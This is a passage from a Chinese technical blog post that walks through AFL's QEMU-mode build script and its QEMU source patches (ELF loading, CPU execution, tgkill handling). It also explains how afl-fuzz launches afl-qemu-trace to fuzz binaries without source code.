class="line"></span><br><span class="line">  echo &quot;[-] Error: key files not found - wrong working directory?&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ ! -f &quot;../afl-showmap&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: ../afl-showmap not found - compile AFL first!&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in libtool wget python automake autoconf sha384sum bison iconv; do</span><br><span class="line"></span><br><span class="line">  T=`which &quot;$i&quot; 2&gt;/dev/null`</span><br><span class="line"></span><br><span class="line">  if [ &quot;$T&quot; = &quot;&quot; ]; then</span><br><span class="line"></span><br><span class="line">    echo &quot;[-] Error: &#x27;$i&#x27; not found, please install first.&quot;</span><br><span class="line">    exit 1</span><br><span class="line"></span><br><span class="line">  fi</span><br><span class="line"></span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">if [ ! -d &quot;/usr/include/glib-2.0/&quot; -a ! -d &quot;/usr/local/include/glib-2.0/&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: devel version of &#x27;glib2&#x27; not found, please install first.&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if echo &quot;$CC&quot; | grep -qF /afl-; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: do not use afl-gcc or afl-clang to compile this tool.&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &quot;[+] All checks passed!&quot;</span><br><span class="line"></span><br><span class="line">ARCHIVE=&quot;`basename -- &quot;$QEMU_URL&quot;`&quot;</span><br><span class="line"></span><br><span class="line">CKSUM=`sha384sum -- &quot;$ARCHIVE&quot; 2&gt;/dev/null | cut -d&#x27; &#x27; -f1`</span><br><span class="line"></span><br><span class="line">if [ ! &quot;$CKSUM&quot; = &quot;$QEMU_SHA384&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[*] Downloading QEMU $&#123;VERSION&#125; from the web...&quot;</span><br><span class="line">  rm -f &quot;$ARCHIVE&quot;</span><br><span class="line">  wget -O &quot;$ARCHIVE&quot; -- &quot;$QEMU_URL&quot; || exit 1</span><br><span class="line"></span><br><span class="line">  CKSUM=`sha384sum -- &quot;$ARCHIVE&quot; 2&gt;/dev/null | cut -d&#x27; &#x27; -f1`</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ &quot;$CKSUM&quot; = &quot;$QEMU_SHA384&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[+] Cryptographic signature on $ARCHIVE checks out.&quot;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">  echo &quot;[-] Error: signature mismatch on $ARCHIVE (perhaps download error?).&quot;</span><br><span class="line">  exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Uncompressing archive (this will take a while)...&quot;</span><br><span class="line"></span><br><span class="line">rm -rf &quot;qemu-$&#123;VERSION&#125;&quot; || exit 1</span><br><span class="line">tar xf &quot;$ARCHIVE&quot; || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Unpacking successful.&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据脚本执行的环境变量CPU_TARGET编译对应架构的QEMU</span></span><br><span class="line">echo &quot;[*] Configuring QEMU for $CPU_TARGET...&quot;</span><br><span class="line"></span><br><span class="line">ORIG_CPU_TARGET=&quot;$CPU_TARGET&quot;</span><br><span class="line"></span><br><span class="line">test &quot;$CPU_TARGET&quot; = &quot;&quot; &amp;&amp; CPU_TARGET=&quot;`uname -m`&quot;</span><br><span class="line">test &quot;$CPU_TARGET&quot; = &quot;i686&quot; &amp;&amp; CPU_TARGET=&quot;i386&quot;</span><br><span class="line"></span><br><span class="line">cd qemu-$VERSION || exit 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对QEMU源码进行patch</span></span><br><span class="line">echo &quot;[*] Applying patches...&quot;</span><br><span class="line"></span><br><span class="line">patch -p1 &lt;../patches/elfload.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/cpu-exec.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/syscall.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/configure.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/memfd.diff || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Patching done.&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--enable-pie seems to give a couple of <span class="built_in">exec</span><span class="string">&#x27;s a second performance</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">improvement, much to my surprise. Not sure how universal this is..</span></span></span><br><span class="line"></span><br><span class="line">CFLAGS=&quot;-O3 -ggdb&quot; ./configure --disable-system \</span><br><span class="line">  --enable-linux-user --disable-gtk --disable-sdl --disable-vnc \</span><br><span class="line">  --target-list=&quot;$&#123;CPU_TARGET&#125;-linux-user&quot; --enable-pie --enable-kvm || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Configuration complete.&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Attempting to build QEMU (fingers crossed!)...&quot;</span><br><span class="line"></span><br><span class="line">make || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Build process successful!&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Copying binary...&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">将编译出来的qemu可执行文件复制为afl-qemu-trace</span></span></span><br><span class="line">cp -f &quot;$&#123;CPU_TARGET&#125;-linux-user/qemu-$&#123;CPU_TARGET&#125;&quot; &quot;../../afl-qemu-trace&quot; || exit 1</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">ls -l ../afl-qemu-trace || exit 1</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Successfully created &#x27;../afl-qemu-trace&#x27;.&quot;</span><br><span class="line"></span><br><span class="line">if [ &quot;$ORIG_CPU_TARGET&quot; = &quot;&quot; ]; then</span><br><span class="line"></span><br><span class="line">  echo &quot;[*] Testing the build...&quot;</span><br><span class="line"></span><br><span class="line">  cd ..</span><br><span class="line"></span><br><span class="line">  make &gt;/dev/null || exit 1</span><br><span class="line"></span><br><span class="line">  gcc test-instr.c -o test-instr || exit 1</span><br><span class="line"></span><br><span class="line">  unset AFL_INST_RATIO</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"><span class="string">We shouldn&#x27;</span>t need the /dev/null hack because program isn<span class="string">&#x27;t compiled with any</span></span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"><span class="string">optimizations.</span></span></span><br><span class="line">  echo 0 | ./afl-showmap -m none -Q -q -o .test-instr0 ./test-instr || exit 1</span><br><span class="line">  echo 1 | ./afl-showmap -m none -Q -q -o .test-instr1 ./test-instr || exit 1</span><br><span class="line"></span><br><span class="line">  rm -f test-instr</span><br><span class="line"></span><br><span class="line">  cmp -s .test-instr0 .test-instr1</span><br><span class="line">  DR=&quot;$?&quot;</span><br><span class="line"></span><br><span class="line">  rm -f .test-instr0 .test-instr1</span><br><span class="line"></span><br><span class="line">  if [ &quot;$DR&quot; = &quot;0&quot; ]; then</span><br><span class="line"></span><br><span class="line">    echo &quot;[-] Error: afl-qemu-trace instrumentation doesn&#x27;t seem to work!&quot;</span><br><span class="line">    exit 1</span><br><span class="line"></span><br><span class="line">  fi</span><br><span class="line"></span><br><span class="line">  echo &quot;[+] Instrumentation tests passed. &quot;</span><br><span class="line">  echo &quot;[+] All set, you can now use the -Q mode in afl-fuzz!&quot;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">  echo &quot;[!] Note: can&#x27;t test instrumentation when CPU_TARGET set.&quot;</span><br><span class="line">  echo &quot;[+] All set, you can now (hopefully) use the -Q mode in afl-fuzz!&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exit 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到编译脚本中是先下载指定 QEMU 版本的源码，进行一些检测，然后进行 patch。patch 是对 QEMU 的 ELF 装载、CPU 执行、系统调用、内存描述符等相关的代码进行了修改，以及对 configure 文件也进行修改。patch 完成之后进行 make，然后将编译完成的 qemu-${CPU_TARGET} 复制到 afl 的目录下，重命名为 afl-qemu-trace，在之后会从 afl-fuzz.c 简单说下 afl-qemu-trace 是如何进行调用的。这个地方说一下，如果要 fuzz 指定架构的二进制文件，那么需要在编译的时候指定编译 qemu 可执行文件针对的架构，例如编译 mips 的命令：<code>CPU_TARGET=mips ./build_qemu_support.sh</code>。然后就是在脚本中测试编译出来的 afl-qemu-trace 能否正常使用。</p>
<p>可见最为关键的地方是进行的几个 patch，patch 文件内容不多，下面来简单分析一下 diff 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~/Code/AFL/qemu_mode/patches [0:49:08] </span><br><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── afl-qemu-cpu-inl.h</span><br><span class="line">├── configure.diff</span><br><span class="line">├── cpu-exec.diff</span><br><span class="line">├── elfload.diff</span><br><span class="line">├── memfd.diff</span><br><span class="line">└── syscall.diff</span><br><span class="line"></span><br><span class="line">0 directories, 6 files</span><br></pre></td></tr></table></figure>

<h3 id="elfload-diff"><a href="#elfload-diff" class="headerlink" title="elfload.diff"></a>elfload.diff</h3><p>如下是 elfload.diff 文件，新增了三个外部引用，在 QEMU 执行 ELF 文件解析的时候获取这些地址。</p>
<ul>
<li>afl_entry_point：ELF 的入口点</li>
<li>afl_start_code：ELF 代码段的 start</li>
<li>afl_end_code：ELF 代码段的 end</li>
</ul>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-rc3-clean/linux-user/elfload.c	2017-08-15 11:39:41.000000000 -0700</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0-rc3/linux-user/elfload.c	2017-08-22 14:33:57.397127516 -0700</span></span><br><span class="line"><span class="meta">@@ -20,6 +20,8 @@</span></span><br><span class="line"> </span><br><span class="line"> #define ELF_OSABI   ELFOSABI_SYSV</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern abi_ulong afl_entry_point, afl_start_code, afl_end_code;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> /* from personality.h */</span><br><span class="line"> </span><br><span class="line"> /*</span><br><span class="line"><span class="meta">@@ -2085,6 +2087,8 @@</span></span><br><span class="line">     info-&gt;brk = 0;</span><br><span class="line">     info-&gt;elf_flags = ehdr-&gt;e_flags;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    if (!afl_entry_point) afl_entry_point = info-&gt;entry;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     for (i = 0; i &lt; ehdr-&gt;e_phnum; i++) &#123;</span><br><span class="line">         struct elf_phdr *eppnt = phdr + i;</span><br><span class="line">         if (eppnt-&gt;p_type == PT_LOAD) &#123;</span><br><span class="line"><span class="meta">@@ -2118,9 +2122,11 @@</span></span><br><span class="line">             if (elf_prot &amp; PROT_EXEC) &#123;</span><br><span class="line">                 if (vaddr &lt; info-&gt;start_code) &#123;</span><br><span class="line">                     info-&gt;start_code = vaddr;</span><br><span class="line"><span class="addition">+                    if (!afl_start_code) afl_start_code = vaddr;</span></span><br><span class="line">                 &#125;</span><br><span class="line">                 if (vaddr_ef &gt; info-&gt;end_code) &#123;</span><br><span class="line">                     info-&gt;end_code = vaddr_ef;</span><br><span class="line"><span class="addition">+                    if (!afl_end_code) afl_end_code = vaddr_ef;</span></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             if (elf_prot &amp; PROT_WRITE) &#123;</span><br></pre></td></tr></table></figure>

<h3 id="cpu-exec-diff"><a href="#cpu-exec-diff" class="headerlink" title="cpu-exec.diff"></a>cpu-exec.diff</h3><p>如下是 cpu-exec.diff 文件，新增了一个头文件 afl-qemu-cpu-inl.h，在 CPU 执行 QEMU 翻译代码的前后位置分别加入了宏定义 AFL_QEMU_CPU_SNIPPET2 和 AFL_QEMU_CPU_SNIPPET1。TB（Translation Block）是 QEMU 进行指令翻译的基本单位。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-rc3-clean/accel/tcg/cpu-exec.c	2017-08-15 11:39:41.000000000 -0700</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0-rc3/accel/tcg/cpu-exec.c	2017-08-22 14:34:55.868730680 -0700</span></span><br><span class="line"><span class="meta">@@ -36,6 +36,8 @@</span></span><br><span class="line"> #include &quot;sysemu/cpus.h&quot;</span><br><span class="line"> #include &quot;sysemu/replay.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#include &quot;../patches/afl-qemu-cpu-inl.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> /* -icount align implementation. */</span><br><span class="line"> </span><br><span class="line"> typedef struct SyncClocks &#123;</span><br><span class="line"><span class="meta">@@ -144,6 +146,8 @@</span></span><br><span class="line">     int tb_exit;</span><br><span class="line">     uint8_t *tb_ptr = itb-&gt;tc_ptr;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    AFL_QEMU_CPU_SNIPPET2;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     qemu_log_mask_and_addr(CPU_LOG_EXEC, itb-&gt;pc,</span><br><span class="line">                            &quot;Trace %p [%d: &quot; TARGET_FMT_lx &quot;] %s\n&quot;,</span><br><span class="line">                            itb-&gt;tc_ptr, cpu-&gt;cpu_index, itb-&gt;pc,</span><br><span class="line"><span class="meta">@@ -365,6 +369,7 @@</span></span><br><span class="line">             if (!tb) &#123;</span><br><span class="line">                 /* if no translated code available, then translate it now */</span><br><span class="line">                 tb = tb_gen_code(cpu, pc, cs_base, flags, 0);</span><br><span class="line"><span class="addition">+                AFL_QEMU_CPU_SNIPPET1;</span></span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line">             mmap_unlock();</span><br></pre></td></tr></table></figure>

<p>如下是两个宏定义的源码，AFL_QEMU_CPU_SNIPPET1 是用来实现翻译的加速，AFL_QEMU_CPU_SNIPPET2 位于执行 TB 的函数，在待 fuzz 程序的入口处，进行 afl_setup，然后执行 afl_forkserver，其中有 fork 执行过程。对于覆盖率的计算则是常见的 afl_maybe_log 函数，在使用 afl-gcc 等编译的程序中也会在基本块插入 afl_maybe_log 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* A snippet patched into tb_find_slow to inform the parent process that</span></span><br><span class="line"><span class="comment">   we have hit a new block that hasn&#x27;t been translated yet, and to tell</span></span><br><span class="line"><span class="comment">   it to translate within its own context, too (this avoids translation</span></span><br><span class="line"><span class="comment">   overhead in the next forked-off copy). */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_QEMU_CPU_SNIPPET1 do &#123; \</span></span><br><span class="line"><span class="meta">    afl_request_tsl(pc, cs_base, flags); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This snippet kicks in when the instruction pointer is positioned at</span></span><br><span class="line"><span class="comment">   _start and does the usual forkserver stuff, not very different from</span></span><br><span class="line"><span class="comment">   regular instrumentation injected via afl-as.h. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_QEMU_CPU_SNIPPET2 do &#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(itb-&gt;pc == afl_entry_point) &#123; \</span></span><br><span class="line"><span class="meta">      afl_setup(); \</span></span><br><span class="line"><span class="meta">      afl_forkserver(cpu); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">    afl_maybe_log(itb-&gt;pc); \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<h3 id="syscall-diff"><a href="#syscall-diff" class="headerlink" title="syscall.diff"></a>syscall.diff</h3><p>如下是 syscall.diff，定义了全局变量 qemu.h，新增外部引用 afl_forksrv_pid，也就是 forkserver 的 pid，新增了对于 TARGET_NR_tgkill 的判定，具体的含义不是很懂，但应该和 target 的执行返回错误码有关。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-rc3-clean/linux-user/syscall.c	2017-08-15 11:39:41.000000000 -0700</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0-rc3/linux-user/syscall.c	2017-08-22 14:34:03.193088186 -0700</span></span><br><span class="line"><span class="meta">@@ -116,6 +116,8 @@</span></span><br><span class="line"> </span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern unsigned int afl_forksrv_pid;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"><span class="meta">@@ -11688,8 +11690,21 @@</span></span><br><span class="line">         break;</span><br><span class="line"> </span><br><span class="line">     case TARGET_NR_tgkill:</span><br><span class="line"><span class="deletion">-        ret = get_errno(safe_tgkill((int)arg1, (int)arg2,</span></span><br><span class="line"><span class="deletion">-                        target_to_host_signal(arg3)));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        &#123;</span></span><br><span class="line"><span class="addition">+          int pid  = (int)arg1,</span></span><br><span class="line"><span class="addition">+              tgid = (int)arg2,</span></span><br><span class="line"><span class="addition">+              sig  = (int)arg3;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+          /* Not entirely sure if the below is correct for all architectures. */</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+          if(afl_forksrv_pid &amp;&amp; afl_forksrv_pid == pid &amp;&amp; sig == SIGABRT)</span></span><br><span class="line"><span class="addition">+              pid = tgid = getpid();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+          ret = get_errno(safe_tgkill(pid, tgid, target_to_host_signal(sig)));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">         break;</span><br><span class="line"> </span><br><span class="line"> #ifdef TARGET_NR_set_robust_list</span><br></pre></td></tr></table></figure>

<p>综上所述，三个 patch 文件所作的工作就是在 qemu 代码翻译的阶段，在 QEMU 翻译基本块 TB 加入指令插桩代码，从 ELF 的入口开始执行，然后进行代码覆盖率和错误代码的相关计算。</p>
<h2 id="afl-fuzz-c-中使用-qemu-mode"><a href="#afl-fuzz-c-中使用-qemu-mode" class="headerlink" title="afl-fuzz.c 中使用 qemu mode"></a>afl-fuzz.c 中使用 qemu mode</h2><p>假设已经简单阅读过 afl-fuzz.c 的源码，在 main 函数参数解析时，会判定 -Q 使用了 qemu mode。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (qemu_mode) FATAL(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">       qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>如果是使用了 qemu mode，会根据 afl-fuzz 的命令参数构造 qemu 的启动参数。在 get_qemu_argv 函数中，主要执行的工作就是为 QEMU 设置相关环境变量，搜索 afl-qemu-trace 程序，构造 afl-qemu-trace 启动的命令参数，也就是将 target_path 修改为如何使用 afl-qemu-trace 执行待 fuzz 程序。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (qemu_mode)</span><br><span class="line">  use_argv = get_qemu_argv(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  use_argv = argv + optind;</span><br></pre></td></tr></table></figure>

<p>那么最终 qemu 模式是如何启动起来的，我根据源码的理解大概是，在 afl-fuzz.c 的 main 函数，在最后的循环中，调用 fuzz_one -&gt; calibrate_case -&gt; init_forkserver -&gt;   execv</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8 <span class="title function_">fuzz_one</span><span class="params">(<span class="type">char</span>** argv)</span>;</span><br><span class="line"><span class="type">static</span> u8 <span class="title function_">calibrate_case</span><span class="params">(<span class="type">char</span>** argv, <span class="keyword">struct</span> queue_entry* q, u8* use_mem, u32 handicap, u8 from_queue)</span>;</span><br><span class="line">EXP_ST <span class="type">void</span> <span class="title function_">init_forkserver</span><span class="params">(<span class="type">char</span>** argv)</span>;</span><br><span class="line">...</span><br><span class="line">    execv(target_path, argv);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>在 init_forkserver 函数中，有将变异数据的文件描述符和待 fuzz 程序的标准输入绑定的过程。当使用 execv 执行 afl-qemu-trace，此时 patch 了的 afl-qemu-trace 会在 ELF 的入口处执行 afl_setup() 函数和 afl_forkserver() 函数，进行真正的待 fuzz 程序的执行。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇文章先简单介绍了 QEMU 执行用户级程序的基本流程，然后通过分析 afl qemu mode 的编译脚本和 diff 文件，简单说明了在 afl 中使用 qemu fuzz 闭源程序的基本流程，然后分析 afl-fuzz.c 源码，简要说明 afl-fuzz 是如何将进行一个变异数据送到待 fuzz 程序中去执行。</p>
<p>如果有问题，或者看到这篇文章的师傅有其他的见解讨论，请联系我，谢谢！</p>
<p>这里有一个简单的对于 AFL qemu mode 的使用，参见<a target="_blank" rel="noopener" href="https://genteeldevil.github.io/2021/12/30/%E4%BD%BF%E7%94%A8afl%E5%AF%B9%E6%97%A0%E6%BA%90%E7%A0%81%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8Cfuzz/">使用afl对无源码程序进行fuzz</a>。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">OneShell</p>
  <div class="site-description" itemprop="description">ToT</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">55</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">OneShell</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


</body>
</html>
